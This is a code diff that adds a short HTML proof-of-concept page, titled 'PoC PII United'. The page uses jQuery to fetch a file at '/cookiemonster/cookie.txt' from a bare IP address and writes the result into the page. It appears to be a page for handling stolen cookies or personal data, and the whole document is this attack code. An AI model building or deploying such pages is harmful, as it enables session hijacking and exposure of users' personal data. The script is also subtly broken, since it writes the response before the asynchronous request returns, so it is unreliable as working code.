@@ -1,0 +1,21 @@
+<html>
+<head><title>PoC PII United</title></head>
+<body>
+<script src="http://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+<script>
+var url = 'http://93.66.243.251/cookiemonster/cookie.txt';
+var response = '';
+$.ajax({ type: "GET",   
+         url: url,   
+         async: true,
+         success : function(text)
+         {
+             response = text;
+         }
+});
+document.write(response);
+</script>
+
+
+</body>
+</html>
